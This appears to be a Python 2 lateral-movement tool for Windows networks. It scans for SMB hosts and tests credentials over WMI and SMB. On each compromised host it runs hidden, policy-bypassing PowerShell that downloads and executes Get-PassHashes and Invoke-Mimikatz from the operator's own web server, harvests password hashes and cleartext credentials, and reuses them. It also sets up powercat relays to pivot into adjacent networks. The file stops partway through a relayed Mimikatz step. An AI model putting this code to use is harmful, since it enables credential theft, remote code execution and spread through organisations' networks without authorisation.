#!/usr/bin/env python
from deps.psexec import *
from deps.wmiexec import *
from deps.smbexec import *
from deps.secretsdump import *
from deps.smb_exploit1 import *
from deps.goldenPac import *
from signal import alarm, signal, SIGALRM, SIGKILL
from subprocess import Popen, PIPE 
import threading
import smbexec2
from SocketServer import ThreadingMixIn, ForkingMixIn
from BaseHTTPServer import HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from netaddr import IPNetwork,IPAddress
import random
import sys
#import socket
import resource
from threading import Timer
import thread, time, sys
import time
import timeout_decorator
import gevent
import csv
import os,binascii
from shutil import copyfile
import glob
import Queue
import nmap

verbose=False

def timeout():
    thread.interrupt_main()

bold=True
from termcolor import colored, cprint

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass
class ForkingSimpleServer(ForkingMixIn, HTTPServer):
    pass

#domain='workgroup'
#username='administrator'
#password='p@ssw0rd'


#relayPortNo=60000
relayPortNo=random.randint(60000,65000)

hashes=None
aesKey=None
k=False
dc_ip=None
mode='SHARE'
share='C$'      
powershellArgs=' -NoP -NonI -W Hidden -ep bypass '

tmpFilename1=binascii.b2a_hex(os.urandom(20))+".ps1" #Get-PassHashes.ps1
tmpFilename2=binascii.b2a_hex(os.urandom(20))+".ps1" #Invoke-Mimikatz.ps1
tmpFilename3=binascii.b2a_hex(os.urandom(20))+".ps1" #Invoke-Ping.ps1
tmpFilename4=binascii.b2a_hex(os.urandom(20))+".ps1" #Invoke-Portscan.ps1
tmpFilename5=binascii.b2a_hex(os.urandom(20))+".ps1" #powercat.ps1
tmpFilename6=binascii.b2a_hex(os.urandom(20))+".ps1" #Start-WebServer.ps1
web_dir = os.getcwd()+"/modules"
orig_dir = os.getcwd()

for f in glob.glob(web_dir+"/*.ps1"):
    tmpFilename=f.replace(web_dir+"/","")
    tmpFilename=tmpFilename.replace(".ps1","")
    if len(tmpFilename)>19:
        os.remove(f)

copyfile(web_dir+"/Get-PassHashes.ps1", web_dir+"/"+tmpFilename1)
copyfile(web_dir+"/Invoke-Mimikatz.ps1", web_dir+"/"+tmpFilename2)
copyfile(web_dir+"/Invoke-Ping.ps1", web_dir+"/"+tmpFilename3)
copyfile(web_dir+"/Invoke-Portscan.ps1", web_dir+"/"+tmpFilename4)
copyfile(web_dir+"/powercat.ps1", web_dir+"/"+tmpFilename5)
copyfile(web_dir+"/start-WebServer.ps1", web_dir+"/"+tmpFilename6)

userPassList=[]
compromisedHostList=[]


class ThreadingExample(object):
    targetIP=''
    targetPort=0

    #def __init__(self, interval=1):
    def __init__(self, ip, portNo):
        interval=10
        self.interval = interval
        self.ip = ip
        self.portNo = portNo

        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True                            # Daemonize thread
        thread.start()                                  # Start the execution
   

    def run(self):
        """ Method that runs forever """
        while True:
            # Do something
            #print('Doing something imporant in the background')
            #if not isOpen(self.ip, self.portNo):
            #	print "Down: "+self.ip+":"+str(self.portNo)
	    #else:
            #	print "Up: "+self.ip+":"+str(self.portNo)
            time.sleep(self.interval)

class relayThread(object):
    def __init__(self, ip, targetIP, portNo, hopPoint1List, hopPoint2List):

        self.hopPoint1List=hopPoint1List
        self.hopPoint2List=hopPoint2List

        threads=[]
    	self.ip = ip
        self.targetIP = targetIP
    	self.portNo = portNo

        #t = threading.Thread(target=self.runWebServer, args=())
        threads = list()
        t = threading.Thread(target=self.run, args=())
        threads.append(t)
        t1 = threading.Thread(target=self.runWebServer, args=())
        threads.append(t1)
        t.start()
        t1.start()
        #print t1.isAlive()
        #thread.start_new_thread(self.run, ())
        #thread.start_new_thread(self.runWebServer, ())

    def runWebServer(self):
        print (setColor("[+]", bold, color="blue"))+" Starting Web Server on host "+self.targetIP+":8000"
        complete=False
        while complete==False:

            domain=self.hopPoint1List[0][0]  
            username=self.hopPoint1List[0][1]  
            password=self.hopPoint1List[0][2]  

            #command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -nop -enc JABIAHMAbwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAEgAdAB0AHAATABpAHMAdABlAG4AZQByADsAJABIAHMAbwAuAFAAcgBlAGYAaQB4AGUAcwAuAEEAZABkACgAIgBoAHQAdABwADoALwAvACsAOgA4ADAAMAAwAC8AIgApADsAJABIAHMAbwAuAFMAdABhAHIAdAAoACkAOwBXAGgAaQBsAGUAIAAoACQASABzAG8ALgBJAHMATABpAHMAdABlAG4AaQBuAGcAKQB7ACQASABDAD0AJABIAHMAbwAuAEcAZQB0AEMAbwBuAHQAZQB4AHQAKAApADsAJABIAFIAZQBzAD0AJABIAEMALgBSAGUAcwBwAG8AbgBzAGUAOwAkAEgAUgBlAHMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBuAHQAZQBuAHQALQBUAHkAcABlACIALAAiAHQAZQB4AHQALwBwAGwAYQBpAG4AIgApADsAJABCAHUAZgA9AFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAKABHAEMAIAAoAEoAbwBpAG4ALQBQAGEAdABoACAAJABQAHcAZAAgACgAJABIAEMALgBSAGUAcQB1AGUAcwB0ACkALgBSAGEAdwBVAHIAbAApACkAKQA7ACQASABSAGUAcwAuAEMAbwBuAHQAZQBuAHQATABlAG4AZwB0AGgANgA0AD0AJABCAHUAZgAuAEwAZQBuAGcAdABoADsAJABIAFIAZQBzAC4ATwB1AHQAcAB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAEIAdQBmACwAMAAsACQAQgB1AGYALgBMAGUAbgBnAHQAaAApADsAJABIAFIAZQBzAC4AQwBsAG8AcwBlACgAKQB9ADsAJABIAHMAbwAuAFMAdABvAHAAKAApAA=="
            command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" -nop -file C:\\windows\\temp\\"+tmpFilename6+" \"http://+:8000/\""
            if verbose==True:
                print command
            portNo=445
            executer = smbexec2.CMDEXEC(username, password, domain, hashes, aesKey, k, dc_ip, mode, share, portNo, command)
            executer.run(self.ip, self.ip)
            results=executer.getOutput()
            complete=True     

    def run(self):
        complete=False
        while complete==False:
            print (setColor("[+]", bold, color="blue"))+" Starting Relay on host: "+self.targetIP+":"+str(self.portNo)
            #command="cmd /c powershell.exe -Command \"IEX (New-Object System.Net.Webclient).DownloadString('http://"+myIP+":8888/powercat.ps1'); powercat -l -p "+str(self.portNo)+" -rep -r tcp:"+self.targetIP+":445\""
            command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" -Command \"IEX (New-Object System.Net.Webclient).DownloadString('http://"+myIP+":8888/"+tmpFilename5+"'); powercat -l -p "+str(self.portNo)+" -rep -r tcp:"+self.targetIP+":445\""
            if verbose==True:
                print command
            results,status=runWMIEXEC(self.ip, domain, username, password, passwordHash, command)            
            if "SessionError" in str(results):
                print "Sleeping for 5 seconds"
                time.sleep(5)
            else:
                complete=True     


def setColor(message, bold=True, color=None, onColor=None):
    retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
    return retVal

def runCommand(args, cwd = None, shell = False, kill_tree = True, timeout = -1, env = None):
    class Alarm(Exception):
        pass
    def alarm_handler(signum, frame):
        raise Alarm
    p = Popen(args, shell = shell, cwd = cwd, stdout = PIPE, stderr = PIPE, env = env)
    if timeout != -1:
        signal(SIGALRM, alarm_handler)
        alarm(timeout)
    try:
        stdout, stderr = p.communicate()
        if timeout != -1:
            alarm(0)
    except Alarm:
        pids = [p.pid]
        if kill_tree:
            pids.extend(get_process_children(p.pid))
        for pid in pids:
            # process might have died before getting to this line
            # so wrap to avoid OSError: no such process
            try: 
                kill(pid, SIGKILL)
            except OSError:
                pass
        return -9, '', ''
    return p.returncode, stdout, stderr  

def parseMimikatzOutput(list1):
    tmpPasswordList=[]
    username1=""
    domain1=""
    password1=""
    lmHash=""
    ntHash=""
    list2=list1.split("\n")
    for x in list2:
        if "Username :" in x or "Domain   :" in x or "Password :" in x or "LM       :" in x or "NTLM     :" in x:
            if "* Username :" in x:
                username1=(x.replace("* Username :","")).strip()
            if "* Domain   :" in x:
                domain1=(x.replace("* Domain   :","")).strip()
            if "* LM       :" in x:
                lmHash=(x.replace("* LM       :","")).strip()
            if "* NTLM     :" in x:
                ntHash=(x.replace("* NTLM     :","")).strip()
                if len(lmHash)<1:
                    lmHash='aad3b435b51404eeaad3b435b51404ee'
                password1=lmHash+":"+ntHash
            if "* Password :" in x:            
                password1=x.replace("* Password :","")
            domain1=domain1.strip()
            username1=username1.strip()
            password1=password1.strip()
            if len(username1)>1 and len(domain1)>1 and len(password1)>1: 
                #if (domain1!="(null)" or username1!="(null)" or password1!="(null)"):
                if domain1!="(null)":                    
                    if not username1.endswith("$") and len(password1)<50:
                        if "\\" in username1:
                            domain1=username1.split("\\")[0]   
                            username1=username1.split("\\")[1]   
                        if len(password1)>0 and password1!='(null)':
                            if [domain1,username1,password1] not in tmpPasswordList:
                                tmpPasswordList.append([str(domain1),str(username1),str(password1)])
                username1=""
                domain1=""
                password1=""
                lmHash=""
                ntHash=""
    return tmpPasswordList

def get_ip_address():
    command="ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\\2/p'"
    results = runCommand(command, shell = True, timeout = 15) 
    resultList=results[1].split("\n")
    return resultList[0]

def my_tcp_server():
    port=8888
    server = ThreadingSimpleServer(('', port), SimpleHTTPRequestHandler)
    # server = ThreadingSimpleServer(('', port), RequestHandler)
    addr, port = server.server_address
    #print (setColor("[+]", bold, color="green"))+" Starting web server"
    try:
        while 1:
            sys.stdout.flush()
            server.handle_request()
    except KeyboardInterrupt:
        print "Finished"

def isOpen(ip,port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   try:
      s.connect((ip, int(port)))
      s.shutdown(2)
      return True
   except:
      return False

def isOpen1(ip,port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   try:
      s.connect((ip, int(port)))
      s.shutdown(2)
      if [ip,port] not in liveList:
          liveList.append([ip,port])
      return True
   except Exception as e:    
      return False      
        
def runWMIEXEC(targetIP,domain,username,password,passwordHash,command):
    resultsOutput=''
    aesKey = None
    share = 'ADMIN$'
    nooutput = False
    k = False
    dc_ip = None
    executer = WMIEXEC(command,username,password,domain,passwordHash,aesKey,share,nooutput,k,dc_ip)
    statusOutput=executer.run(targetIP)
    resultsOutput=executer.getOutput()
    return resultsOutput,statusOutput    

def runSMBEXEC(targetIP,portNo,domain,username,password,passwordHash,command):
    executer = CMDEXEC(username, password, domain, passwordHash, None, False, None, "SHARE", "C$", int(portNo), command)
    executer.run(targetIP, targetIP)
    resultsOutput = executer.getOutput()
    executer.stop()
    return resultsOutput

def scanThread(ip, port):
    try:
        t = threading.Thread(target=isOpen1, args=(ip, port))
        t.start()
    except Exception as e:
        print e
        pass

def tcp_scan((target, port)):
    target, port = (target, port)
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1,0))
        conn.settimeout(1)
        ret = conn.connect_ex((target, port))
        if (ret==0):
            sys.stdout.write("[%s] %s - %d/tcp open (SYN-ACK packet)\n" % (date_time(), target, port))
            ports_ident["open"].append(port)
    	elif (ret == 111):
            sys.stdout.write("[%s] %s - %d/tcp closed (RST packet)\n" % (date_time(), target, port))
            ports_ident["closed"].append(port)
    	elif (ret == 11):
           ports_ident["filtered"].append(port)
                
    	else:
        	print port
    except socket.timeout:
    	ports_ident["filtered"].append(port)
    conn.close()

def multi_threader_tcp():
    while True:
        ip_and_port = q.get()
	print ip_and_port
        tcp_scan(ip_and_port)
        q.task_done()

def testAccount(targetIP, domain, username, password, passwordHash):
    if username!="guest":
        if domain==None or len(domain)<1:
            domain='WORKGROUP'
        cmd='whoami'
    complete=False
    results=''
    status=''
    while complete==False:
        results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd) 
        if "can't start new thread" not in str(status):
            complete=True
        if 'STATUS_LOGON_FAILURE' in str(status):
            if len(domain)>0:
                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [Failed]"            
            else:
                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+username+":"+password+" [Failed]"            
            return False
        elif 'rpc_s_access_denied' in str(status) or 'WBEM_E_ACCESS_DENIED' in str(status) or 'access_denied' in str(status).lower():
            if len(domain)>0:
                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" [OK][Not Admin]"            
            else:
                print (setColor("[-]", bold, color="red"))+" "+targetIP+":445 | "+username+":"+password+" [OK][Not Admin]"            
            return False        
        else:
            #if len(domain)>0:
            #    print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+domain+"\\"+username+":"+password+" "+(setColor("[OK][Admin]", bold, color="green"))           
            #else:
            #    print (setColor("[+]", bold, color="green"))+" "+targetIP+":445 | "+username+":"+password+" "+(setColor("[OK][Admin]", bold, color="green"))          
            return True

@timeout_decorator.timeout(30)
def testMapDrive(tmpdomain,tmpusername,tmppassword):
    results=''
    command="net use \\\\"+ip+"\C$ "+tmppassword+" /USER:"+tmpdomain+"\\"+tmpusername                    
    if verbose==True:
        print command
    results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)
    if verbose==True:
        print results    
    return results

def monitor_server(ip,port):
    time.sleep(10)
    try:
	    while 1:
    		if not isOpen(ip,port):
			print "Down: "+ip+":"+str(port)
		time.sleep(10)
    except KeyboardInterrupt:
        print "Finished1"

parser = argparse.ArgumentParser(
        prog='PROG',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=('''\
'''))
parser.add_argument("target", nargs='*', type=str, help="File containing a list of targets (e.g. 192.168.1.0/24 or 192.168.1.2)")
parser.add_argument("-C", type=str, dest="tmpCredList", help="File containing credentials (Domain||Username||Password)")
parser.add_argument("-d", type=str, dest="tmpDomain", help="Domain")
parser.add_argument("-u", type=str, dest="tmpUsername", help="Username")
parser.add_argument("-p", type=str, dest="tmpPassword", help="Password")
parser.add_argument("-D", "--debug", action='store_true', help="Verbose mode")
if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
args = parser.parse_args()
inputStr=args.target[0]

if args.debug:
    verbose=True
if args.tmpCredList:
        if os.path.exists(orig_dir+"/"+args.tmpCredList):
            with open(orig_dir+"/"+args.tmpCredList) as f:
                lines = f.read().splitlines()
                for x in lines:
                	domain1=x.split("||")[0]
                	username1=x.split("||")[1]
                	password1=x.split("||")[2]
                	if [domain1,username1,password1] not in userPassList:
                	    userPassList.append([domain1,username1,password1])
if args.tmpDomain and args.tmpUsername and args.tmpPassword:
    if [args.tmpDomain,args.tmpUsername,args.tmpPassword] not in userPassList:
        userPassList.append([args.tmpDomain,args.tmpUsername,args.tmpPassword])

try:
    	os.chdir(web_dir)
	threading.Thread(target=my_tcp_server).start()
	myIP=get_ip_address()

        ipList=[]
	liveList=[]	
    	portList=[]
    	portList.append("445")
    	if "/" in inputStr:
    	    for x in IPNetwork(inputStr):
       			if str(x) not in ipList: 
                    		ipList.append(str(x))
        else:
            if os.path.exists(orig_dir+"/"+inputStr):
                with open(orig_dir+"/"+inputStr) as f:
                    lines = f.read().splitlines()
                    for x in lines:
                        ipList.append(x)
                        '''
                        if "/" in x:
                            for y in IPNetwork(x):
                                if str(y) not in ipList:
                                    if str(y) not in ipList:
                                        ipList.append(str(y))
                        else:
                            if x not in ipList:
                                ipList.append(x)
                        '''
            else:
                ipList.append(inputStr)
        '''
    	resource.setrlimit(resource.RLIMIT_NOFILE, (1024, 3000))
    	screenLock = threading.Semaphore(value=3)
    	for port in portList:
            for x in ipList:
            	scanThread(x, port)                
        '''
        nm = nmap.PortScanner()
        for x in ipList:
            nm.scan(x,'445')
            tmpHostList=nm.all_hosts()
            for y in tmpHostList:
                if not y.endswith(".1") and not y.endswith(".255"): 
                        if y not in liveList:
                            liveList.append(y)

        print (setColor("[+]", bold, color="blue"))+" Checking for live IPs provided in file: "+inputStr                                
        for x in liveList:
            print "Found IP on Same Subnet: "+x         
            if x in ipList:
                ipList.remove(x)
        for x in ipList:
            if x.endswith(".1") or x.endswith(".255"):
                ipList.remove(x)
        ipList[:] = [item for item in ipList if item != '']

    	for x in liveList:
            targetIP=x
            finalComplete=False
            while finalComplete==False:
                for y in userPassList:
                    if targetIP not in compromisedHostList:
                        domain=y[0]
                        username=y[1]
                        password=y[2]            
                        passwordHash=None
                        if testAccount(targetIP, domain, username, password, passwordHash)==True:
                            print "\n"+(setColor("[+]", bold, color="green"))+" Testing credentials against "+targetIP+(setColor(" [OK][ADMIN]", bold, color="green"))+" ("+domain+"\\"+username+"|"+password+")"
                            ipStr=",".join(ipList)
                            results=''
                            #cmd="powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/milo2012/fccfe135d3b2646f191a83f8107971c8/raw/838011a6545b23c1c1775955501f3da54cd488cd/Invoke-Ping.ps1'); Invoke-Ping -Quiet "+ipStr+"\""

                            complete=False
                            print (setColor("[+]", bold, color="green"))+" Dumping password hashes from "+targetIP
                            command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString('http://"+myIP+":8888/"+tmpFilename1+"'); Get-PassHashes\""
                            if verbose==True:
                               print command
                            while complete==False:
                                results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                results=results.replace("\r","")
                                results=results.replace("\n","")
                                if len(results)>2:
                                    complete=True
                                else:
                                    print "Sleeping for 3 seconds"
                                    time.sleep(3)
                            tmpResultList=results.split(":::")
                            if len(tmpResultList)>0:
                                print "\n"
                                for z in tmpResultList:
                                    z=z.strip()
                                    if len(z)>0:
                                        print z+":::"                               
                                print "\n"
                                if targetIP not in compromisedHostList:
                                    compromisedHostList.append(targetIP)

                            complete=False
                            while complete==False:
                                print (setColor("[+]", bold, color="green"))+" Running Mimikatz against "+targetIP
                                #command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass \"IEX (New-Object Net.WebClient).DownloadString('http://"+tmpSelectedIP+":8000/download?filepath=C:\windows\\temp\Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds\""
                                command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString('http://"+myIP+":8888/"+tmpFilename2+"');Invoke-Mimikatz -DumpCreds\""
                                if verbose==True:
                                    print command
                                results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                if "Could not connect: timed out" in str(results):
                                        print "Sleeping for 3 seconds"
                                        time.sleep(3)
                                else:                                
                                    if len(str(results))>100:
                                        tmpList=parseMimikatzOutput(results)
                                        for x in tmpList:   
                                            tmpDomain=x[0]
                                            tmpUsername=x[1]
                                            tmpPassword=x[2]
                                            print "\nIP: "+targetIP
                                            print "Domain: "+x[0]   
                                            print "Username: "+x[1]
                                            print "Password: "+x[2]
                                            if [x[0],x[1],x[2]] not in userPassList:
                                                userPassList.append([x[0],x[1],x[2]])
                                        if targetIP not in compromisedHostList:
                                            compromisedHostList.append(targetIP)
                                        complete=True
                            complete=False
                            print "\n"+(setColor("[+]", bold, color="blue"))+" Ping sweep via host "+targetIP                         
                            while complete==False:
                                #cmd="powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://"+myIP+":8888/Invoke-Ping.ps1'); Invoke-Ping -Quiet "+ipStr+"\""
                                cmd="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" -Command \"IEX (New-Object Net.WebClient).DownloadString('http://"+myIP+":8888/"+tmpFilename3+"'); Invoke-Ping -Quiet "+ipStr+"\""
                                results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd)
                                if "timed out" in str(results) or "System.IO.IOException" in str(results):
                                    print "Sleeping for 3 seconds"
                                    time.sleep(3)
                                else:
                                    complete=True                    
                            tmpResultlist=results.split("\n")
                            tmpResultlist1=[]
                            tmpIPList1=[]
                            for z in tmpResultlist:
                                if len(z)>0:         
                                    print "Found IP on Adjacent Network: "+z             
                                    tmpIPList1.append(str(z).strip())
                            tmpIPListStr1=",".join(tmpIPList1)
                            print "\n"+(setColor("[+]", bold, color="blue"))+" Looking for NetBIOS hosts via host: "+targetIP                     
                            #cmd ="powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://"+myIP+":8888/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts "+tmpIPListStr1+" -ports 445 -noProgressMeter | Select-Object -ExpandProperty Hostname\""
                            cmd ="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" -Command \"IEX (New-Object Net.WebClient).DownloadString('http://"+myIP+":8888/"+tmpFilename4+"'); Invoke-Portscan -Hosts "+tmpIPListStr1+" -ports '445,3389' -noProgressMeter | Select-Object Hostname,openPorts\""
                            if verbose==True:
                                print cmd
                            tmpNetbiosList=[]     
                            tmpRDPList=[]           
                            results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, cmd)
                            if len(results)>0 and "Exception" not in str(results):
                                tmpResultlist1=results.split("\n")
                                for z in tmpResultlist1:
                                    if len(z)>0:
                                        tmpHostNo=z.split(" ")[0]
                                        if "445" in z:
                                            print "Found port 445/tcp on host: "+tmpHostNo
                                            if tmpHostNo not in tmpNetbiosList:
                                                tmpNetbiosList.append(tmpHostNo)
                                        if "3389" in z:
                                            print "Found port 3389/tcp on host: "+tmpHostNo
                                            if tmpHostNo not in tmpRDPList:
                                                tmpRDPList.append(tmpHostNo)
                            else:
                                print "Unable to access "+myIP+":8000. Please restart."
                                os._exit(1)
                            print "\n"
                            for z in userPassList:
                                tmpdomain=z[0]
                                tmpusername=z[1]
                                tmppassword=z[2]
                                #tmpdomain="workgroup"
                                #tmpusername="milo"
                                #tmppassword="p@ssw0rd"     
                                for ip in tmpNetbiosList:
                                    ip=ip.strip()
                                    results=''
                                    results=testMapDrive(tmpdomain,tmpusername,tmppassword)
                                    #Timer(30, timeout).start()
                                    #command="net use \\\\"+ip+"\C$ "+tmppassword+" /USER:"+tmpdomain+"\\"+tmpusername                    
                                    #results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)
                                    if "Login failure" in str(results) or "Access is denied" in str(results) or "The specified network password is not correct" in str(results):
                                        if "Login failure" in str(results) or "The specified network password is not correct" in str(results): 
                                            print (setColor("[-]", bold, color="red"))+" Testing credentials against "+ip+(setColor(" [FAIL]", bold, color="red"))+" ("+tmpdomain+"\\"+tmpusername+"|"+tmppassword+")"
                                        if "Access is denied" in str(results): 
                                            print (setColor("[-]", bold, color="red"))+" Testing credentials against "+ip+(setColor(" [OK]", bold, color="red"))+" ("+tmpdomain+"\\"+tmpusername+"|"+tmppassword+")"
                                    else:
                                        if "The command completed successfully" in str(results): 
                                            print (setColor("[+]", bold, color="green"))+" Testing credentials against "+ip+(setColor(" [OK][ADMIN]", bold, color="green"))+" ("+tmpdomain+"\\"+tmpusername+"|"+tmppassword+")"
                                            #print "\n"+(setColor("[+]", bold, color="green"))+" Found: "+tmpdomain+"\\"+tmpusername+":"+tmppassword+" ("+ip+")"                   

                                            command='tasklist /FI "IMAGENAME eq powershell.exe" /FO CSV'
                                            results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                            if "access_denied" in str(status).lower():
                                                print (setColor("[+]", bold, color="red"))+" Invalid credentials"
                                                os._exit(1)
                                            if "powershell.exe" in results:
                                                #print (setColor("[+]", bold, color="green"))+" Checking and killing existing powershell.exe processes"
                                                command='taskkill /F /IM powershell.exe'
                                                results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            

                                            print "\n"+(setColor("[+]", bold, color="blue"))+" Listing all IP addresses on Host: "+targetIP
                                            command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" -Command (netsh i ip sh ad)-match'Address'-replace'.+:\s+(\S+)','$1'"
                                            results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                            tmpResultList=results.split("\n")
                                            tmpIPList=[]
                                            for z in tmpResultList:
                                                z=z.strip()
                                                if "127.0.0.1" not in z:
                                                    if z not in tmpIPList and len(z)>0:
                                                        tmpIPList.append(z)

                                            print (setColor("[+]", bold, color="blue"))+" Upload Temporary Files to Host: "+targetIP
                                            #command='C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -ep bypass -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8888/Start-WebServer.ps1\',\'C:\\windows\\temp\\Start-WebServer.ps1\');"'
                                            command='C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '+powershellArgs+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8888/'+tmpFilename6+'\',\'C:\\windows\\temp\\'+tmpFilename6+'\');"'
                                            results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                            print results
                                            #command='C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -ep bypass -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8888/Invoke-Mimikatz.ps1\',\'C:\\windows\\temp\\Invoke-Mimikatz.ps1\');"'
                                            command='C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '+powershellArgs+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8888/'+tmpFilename2+'\',\'C:\\windows\\temp\\'+tmpFilename2+'\');"'
                                            results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                            print results
                                            #command='C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -ep bypass -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8888/Get-PassHashes.ps1\',\'C:\\windows\\temp\\Get-PassHashes.ps1\');"'
                                            command='C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '+powershellArgs+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8888/'+tmpFilename1+'\',\'C:\\windows\\temp\\'+tmpFilename1+'\');"'
                                            results,status=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                                            print results

                                            hopPoint1=targetIP
                                            hopPoint2=ip
                                            hopPoint1List=[]
                                            hopPoint1List.append([domain,username,password])

                                            hopPoint2List=[]
                                            hopPoint2List.append([tmpdomain,tmpusername,tmppassword])

                                            example = relayThread(hopPoint1,hopPoint2,relayPortNo,hopPoint1List,hopPoint2List)

                                            tmpSelectedIP=''

                                            if len(tmpIPList)>1:
                                                print (setColor("[+]", bold, color="green"))+" Host has multiple IP addresses: "+", ".join(tmpIPList)

                                                print (setColor("[+]", bold, color="blue"))+" Checking which IP address on "+targetIP+" is accessible by "+ip
                                                while len(tmpSelectedIP)<1:
                                                    for z in tmpIPList:
                                                        command='C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '+powershellArgs+' -Command "$ping = new-object system.net.networkinformation.ping; $ping.send(\''+z+'\') | Select-Object -ExpandProperty Status"'
                                                        if verbose==True:
                                                            print command
                                                        executer = smbexec2.CMDEXEC(tmpusername, tmppassword, tmpdomain, hashes, aesKey, k, dc_ip, mode, share, relayPortNo, command)
                                                        executer.run(targetIP,targetIP)
                                                        results=executer.getOutput()
                                                        if verbose==True:
                                                            print results
                                                        if "Success" in str(results):
                                                            tmpSelectedIP=z
                                                            print (setColor("[+]", bold, color="green"))+" IP address "+tmpSelectedIP+" reachable by "+ip
                                            else:
                                                tmpSelectedIP=tmpIPList[0]

                                            if len(tmpSelectedIP)<1:
                                                print "Unable to find a route from "+ip+" to "+targetIP
                                            else:
                                                complete=False
                                                print (setColor("[+]", bold, color="green"))+" Dumping password hashes from "+ip+" via "+targetIP+":"+str(relayPortNo)
                                                #command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass \"IEX (New-Object Net.WebClient).DownloadString('http://"+tmpSelectedIP+":8000/download?filepath=C:\windows\\temp\Get-PassHashes.ps1'); Get-PassHashes\""
                                                command="C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString('http://"+tmpSelectedIP+":8000/download?filepath=C:\windows\\temp\\"+tmpFilename1+"'); Get-PassHashes\""
                                                if verbose==True:
                                                   print command
                                                while complete==False:
                                                    executer = smbexec2.CMDEXEC(tmpusername, tmppassword, tmpdomain, hashes, aesKey, k, dc_ip, mode, share, relayPortNo, command)
                                                    executer.run(targetIP,targetIP)
                                                    results=executer.getOutput()
                                                    results=results.replace("\r","")
                                                    results=results.replace("\n","")
                                                    if len(results)>2:
                                                        complete=True
                                                    else:
                                                        print "Sleeping for 3 seconds"
                                                        time.sleep(3)
                                                tmpResultList=results.split(":::")
                                                if len(tmpResultList)>0:
                                                    print "\n"
                                                    for z in tmpResultList:
                                                        z=z.strip()
                                                        if len(z)>0:
                                                            print z+":::"                               
                                                    print "\n"
                                                    if ip not in compromisedHostList:
                                                        compromisedHostList.append(ip)

                                                print (setColor("[+]", bold, color="green"))+" Running Mimikatz against "+ip+" via "+targetIP+":"+str(relayPortNo)
